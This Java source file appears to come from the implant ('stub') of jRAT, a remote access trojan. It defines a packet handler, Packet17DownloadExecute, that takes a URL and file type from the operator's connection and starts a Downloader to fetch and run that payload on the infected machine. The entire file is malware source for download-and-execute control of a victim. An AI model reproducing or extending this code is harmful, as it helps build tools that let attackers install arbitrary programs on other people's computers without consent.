package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.Downloader;

public class Packet17DownloadExecute extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String url = Connection.readLine();
		String type = Connection.readLine();
		boolean readFromSocket = Connection.readBoolean();
		
		if (readFromSocket) {
			new Downloader(url, false, type, readFromSocket).run();
		} else {
			new Downloader(url, false, type, readFromSocket).start();
		}
		
		
	}

}